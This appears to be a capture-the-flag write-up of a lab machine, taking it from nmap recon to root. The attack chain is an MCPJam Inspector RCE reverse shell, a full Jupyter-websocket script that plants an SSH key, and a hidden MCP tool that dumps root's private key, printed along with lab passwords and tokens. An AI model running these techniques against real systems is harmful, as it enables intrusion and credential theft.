
Initial enumaeration :

```
nmap -sV 10.129.6.142   
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-01 20:05 +0530
Nmap scan report for 10.129.6.142
Host is up (0.49s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.89 seconds

```

The http(port 80 is open ),

```
$ curl -v  10.129.6.142
*   Trying 10.129.6.142:80...
* Established connection to 10.129.6.142 (10.129.6.142 port 80) from 10.10.15.196 port 54804 
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 10.129.6.142
> User-Agent: curl/8.19.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 302 Moved Temporarily
< Server: nginx/1.18.0 (Ubuntu)
< Date: Mon, 01 Jun 2026 14:36:50 GMT
< Content-Type: text/html
< Content-Length: 154
< Connection: keep-alive
< Location: http://devhub.htb/
< 
<html>
<head><title>302 Found</title></head>
<body>
<center><h1>302 Found</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
* Connection #0 to host 10.129.6.142:80 left intact

```

Now , see the location --> http://devhub.htb/

so add the devhub.htb in local dns , by sudo nano /etc/hosts

and then open the site in the browser , it looks like this ,

![[Pasted image 20260601200935.png]]

now see the MCP Inspector , it shows that `active port at 6274` and then visit http://devhub.htb:6274/  

![[Pasted image 20260601201124.png]]

the version is `MCPJam Version: v1.4.2` , Now we know the version , i found the CVE of MCPJam inspector the repository link is `https://github.com/boroeurnprach/CVE-2026-23744-PoC/tree/main`

and then by using the CVE , i got the mcp-dev shell using the reverse shell,

```
┌──(mithun㉿kali)-[~/Documents/htb-vpn]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.196] from (UNKNOWN) [10.129.6.91] 58584
bash: cannot set terminal process group (1065): Inappropriate ioctl for device
bash: no job control in this shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ ls
ls
LICENSE
README.md
assets
bin
dist
node_modules
package.json
```

Before going to the attack , lets first understand the CVE 

## The understanding of CVE 2026-23744:

MCPJam inspector is the local-first development platform for MCP servers. The Latest version Versions 1.4.2 and earlier are vulnerable to remote code execution (RCE) vulnerability, which allows an attacker to send a crafted HTTP request that triggers the installation of an MCP server, leading to RCE.

the main flaw in this attack was , The `/api/mcp/connect` API, which is intended for connecting to MCP servers, becomes an open entry point for unauthorized requests. When an HTTP request reaches the `/connect` route, the system extracts the `command` and `args` fields without performing any security checks, leading to the execution of arbitrary command.

### The exploit.py:

```
cmd = "sh"
    args = ["-c", command]
    
    payload = {
        "serverConfig": {
            "command": cmd,
            "args": args,
            "env": {
                "DISPLAY": os.environ.get("DISPLAY", ":0")
            }
        },
        "serverId": "rce_test"
    }
```

the command is sh and then args is what we will give like 'id' etc... for making the exploit we need the serverConfig and two parameter they are command and args .

after getting the mcp-dev shell , which is low level user ,

i search it for user.txt , but it doesn't , so i got the srever.py file which is in `/opt/opsmcp`

but it need the permission . By doing the internal service detection .

```mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ ss -tlnp
ss -tlnp
State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                                    
LISTEN 0      100        127.0.0.1:40753      0.0.0.0:*                                              
LISTEN 0      100        127.0.0.1:53003      0.0.0.0:*                                              
LISTEN 0      100        127.0.0.1:38459      0.0.0.0:*                                              
LISTEN 0      511          0.0.0.0:80         0.0.0.0:*                                              
LISTEN 0      100        127.0.0.1:42525      0.0.0.0:*                                              
LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                              
LISTEN 0      511          0.0.0.0:6274       0.0.0.0:*    users:(("node-MainThread",pid=1280,fd=29))
LISTEN 0      100        127.0.0.1:38233      0.0.0.0:*                                              
LISTEN 0      100        127.0.0.1:40401      0.0.0.0:*                                              
LISTEN 0      100        127.0.0.1:50325      0.0.0.0:*                                              
LISTEN 0      100        127.0.0.1:46297      0.0.0.0:*                                              
LISTEN 0      128        127.0.0.1:5000       0.0.0.0:*                                              
LISTEN 0      100        127.0.0.1:37787      0.0.0.0:*                                              
LISTEN 0      100        127.0.0.1:45597      0.0.0.0:*                                              
LISTEN 0      100        127.0.0.1:45659      0.0.0.0:*                                              
LISTEN 0      128        127.0.0.1:8888       0.0.0.0:*                                              
LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*                                              
LISTEN 0      100        127.0.0.1:43115      0.0.0.0:*                                              
LISTEN 0      128             [::]:22            [::]:*      

```

after I run the command `ps auxf` for knowing the process running ,

```
analyst     1063  0.0  2.5 192756 100648 ?       Ssl  03:31   0:08 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
```

we Found that port 8888 , the jupyter is running as analyst , so if we send the request to the jupyter it will run as analyst , We found the **token = a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7** 

and i gather whether there are any content using the /api,

```
mcp-dev@devhub:/opt/opsmcp$ curl -s \
"http://127.0.0.1:8888/api/contents/.?content=1&token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"curl -s \
> 
<t=1&token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
{"name": "", "path": "", "last_modified": "2026-05-26T08:42:22.462480Z", "created": "2026-05-26T08:42:22.462480Z", "content": [{"name": "quarterly_analysis.ipynb", "path": "quarterly_analysis.ipynb", "last_modified": "2026-01-22T15:06:49.961594Z", "created": "2026-05-26T08:42:21.153593Z", "content": null, "format": null, "mimetype": null, "size": 556, "writable": true, "hash": null, "hash_algorithm": null, "type": "notebook"}], "format": "json", "mimetype": null, "size": null, "writable": true, "hash": null, "hash_algorithm": null, "type": "directory"}
```

this shows that name : quarterly_analysis.ipynb and writable : true  , so we can create a socket to the 127.0.0.1:8888 and it run as the analyst 

 I have create the public and private ssh key using the `ssh-keygen -t ed25519`

```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO5OCcAW75qdD1B+Z9QieawYA+9kfYNosMlktS0X9xtx mcp-dev@devhu
```

and i going to modify the `/home/analyst/.ssh/authorized_keys` using the below script

```
cat > /tmp/ws_exploit.py << 'PYEOF'
import socket, base64, json, uuid, time, os

TOKEN = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
KERNEL_ID = "4f11cd76-154b-42ec-a4cc-10f4e4da062e"

key = base64.b64encode(os.urandom(16)).decode()
s = socket.create_connection(("127.0.0.1", 8888))

handshake = (
    f"GET /api/kernels/{KERNEL_ID}/channels?token={TOKEN} HTTP/1.1\r\n"
    f"Host: 127.0.0.1:8888\r\n"
    f"Upgrade: websocket\r\n"
    f"Connection: Upgrade\r\n"
    f"Sec-WebSocket-Key: {key}\r\n"
    f"Sec-WebSocket-Version: 13\r\n\r\n"
)
s.send(handshake.encode())
resp = s.recv(4096).decode()
print("Handshake:", resp[:80])

def ws_frame(payload):
    data = payload.encode()
    mask = os.urandom(4)
    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(data))
    length = len(data)
    if length <= 125:
        header = bytes([0x81, 0x80 | length]) + mask
    else:
        header = bytes([0x81, 0xFE, length >> 8, length & 0xFF]) + mask
    return header + masked

code = (
    "import os\n"
    "os.makedirs('/home/analyst/.ssh',exist_ok=True)\n"
    "open('/home/analyst/.ssh/authorized_keys','a').write("
    "'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO5OCcAW75qdD1B+Z9QieawYA+9kfYNosMlktS0X9xtx mcp-dev@devhub\\n')\n"
    "os.chmod('/home/analyst/.ssh/authorized_keys',0o600)\n"
    
    "os.chmod('/home/analyst/.ssh',0o700)\n"
    "print('DONE')"
)

msg = json.dumps({
    "header": {"msg_id": str(uuid.uuid4()), "username": "user",
                "session": str(uuid.uuid4()), "msg_type": "execute_request", "version": "5.0"},
    "parent_header": {}, "metadata": {},
    "content": {"code": code, "silent": False},
    "channel": "shell"
})

s.send(ws_frame(msg))
time.sleep(4)
s.settimeout(3)
try:
    data = s.recv(8192)
    print("Response bytes:", len(data))
except:
    pass
s.close()
print("Payload sent!")
PYEOF
```


Using the ssh key login as analyst 

	`ssh -i /tmp/htb_key -o StrictHostKeyChecking=no analyst@127.0.0.1

and find the user flag ,

```
ls
jupyter-env
notebooks
user.txt
```

and next thing we need became root , first read the server.py code 

```
cat server.py
#!/usr/bin/env python3
"""
OPSMCP - Operations MCP Server
Internal tool for system operations management
"""

from flask import Flask, jsonify, request
import os

app = Flask(__name__)

# API Key for authentication
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

# Registered tools (visible)
VISIBLE_TOOLS = {
    "ops.system_status": {
        "description": "Get system status and health metrics",
        "parameters": {}
    },
    "ops.list_services": {
        "description": "List running services",
        "parameters": {}
    },
    "ops.check_disk": {
        "description": "Check disk usage",
        "parameters": {}
    },
    "ops.view_logs": {
        "description": "View recent system logs",
        "parameters": {"service": "string"}
    }
}

# Hidden tools (not in /tools/list but callable)
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}

ALL_TOOLS = {**VISIBLE_TOOLS, **HIDDEN_TOOLS}

def check_auth():
    """Check API key authentication"""
    api_key = request.headers.get('X-API-Key', '')
    return api_key == VALID_API_KEY

@app.route('/')
def index():
    return jsonify({
        "server": "OPSMCP",
        "version": "2.1.0",
        "status": "operational",
        "endpoints": ["/tools/list", "/tools/call", "/health"],
        "auth": "Required - X-API-Key header"
    })

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "uptime": "14d 3h 22m"})

@app.route('/tools/list')
def list_tools():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401
    
    return jsonify({
        "tools": list(VISIBLE_TOOLS.keys()),
        "count": len(VISIBLE_TOOLS),
        "details": VISIBLE_TOOLS
    })

@app.route('/tools/call', methods=['POST'])
def call_tool():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401
    
    data = request.get_json() or {}
    tool_name = data.get('name', '')
    args = data.get('arguments', {})
    
    if not tool_name:
        return jsonify({"error": "Tool name required"}), 400
    
    if tool_name not in ALL_TOOLS:
        return jsonify({"error": f"Unknown tool: {tool_name}"}), 404
    
    # Execute tool
    if tool_name == "ops.system_status":
        return jsonify({
            "cpu": "23%",
            "memory": "1.2GB/4GB",
            "load": "0.45",
            "status": "nominal"
        })
    
    elif tool_name == "ops.list_services":
        return jsonify({
            "services": [
                {"name": "nginx", "status": "running", "pid": 1234},
                {"name": "opsmcp", "status": "running", "pid": 5678},
                {"name": "jupyter", "status": "running", "pid": 9012},
                {"name": "mcpjam", "status": "running", "pid": 3456}
            ]
        })
    
    elif tool_name == "ops.check_disk":
        return jsonify({
            "filesystems": [
                {"mount": "/", "used": "4.2G", "available": "15G", "percent": "22%"},
                {"mount": "/home", "used": "1.1G", "available": "8G", "percent": "12%"}
            ]
        })
    
    elif tool_name == "ops.view_logs":
        service = args.get('service', 'system')
        return jsonify({
            "service": service,
            "logs": [
                "[2026-01-22 10:00:01] Service started",
                "[2026-01-22 10:00:02] Listening on configured port",
                "[2026-01-22 10:15:33] Health check passed",
                "[2026-01-22 11:00:00] Routine maintenance completed"
            ]
        })
    
    elif tool_name == "ops._debug_mode":
        return jsonify({
            "debug": True,
            "message": "Debug mode enabled",
            "hidden_tools": list(HIDDEN_TOOLS.keys()),
            "note": "Debug endpoints now accessible"
        })
    
    elif tool_name == "ops._admin_dump":
        target = args.get('target', '')
        confirm = args.get('confirm', False)
        
        if not confirm:
            return jsonify({
                "error": "Confirmation required",
                "usage": "Set confirm=true to proceed",
                "warning": "This dumps sensitive credentials"
            })
        
        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
                    "note": "Emergency recovery key dump"
                })
            except Exception as e:
                return jsonify({
                    "target": "ssh_keys",
                    "error": f"Could not read key: {str(e)}"
                })
        
        elif target == "passwords":
            return jsonify({
                "target": "passwords",
                "dump": {
                    "root": "$6$rounds=656000$saltsalt$hashedpassword",
                    "analyst": "JupyterN0tebook!2026",
                    "mcp-dev": "Mcp!Insp3ct0r2026"
                }
            })
        
        elif target == "tokens":
            return jsonify({
                "target": "tokens",
                "api_tokens": {
                    "admin_token": "opsmcp_admin_7f3b9c2d1e4f5a6b",
                    "service_token": "opsmcp_svc_8c9d0e1f2a3b4c5d"
                }
            })
        
        else:
            return jsonify({
                "error": "Invalid target",
                "valid_targets": ["ssh_keys", "passwords", "tokens"]
            })
    
    return jsonify({"error": "Tool execution failed"}), 500

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)

```


see the  **/tools/call**  and if the tool_name == ops._admin_dump and target == "ssh_keys

and  confirm:true we can know the rsa key , 

```
curl -s -X POST http://127.0.0.1:5000/tools/call \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9\nG/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX\n8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z\n6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n\nGhm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ\n7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W\nv9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu\nITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs\ngyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s\nqKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa\nV3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS\n0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6\nJtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8\nHUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB\ndcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L\nCvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2\nnkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn\nMz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK\nMtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI\noocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk\nJt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ\nnI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr\nC8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=\n-----END OPENSSH PRIVATE KEY-----\n","target":"ssh_keys"}
```

and we can login as root `ssh -i /tmp/root_key -o StrictHostKeyChecking=no root@127.0.0.1`

and grab the root flag ,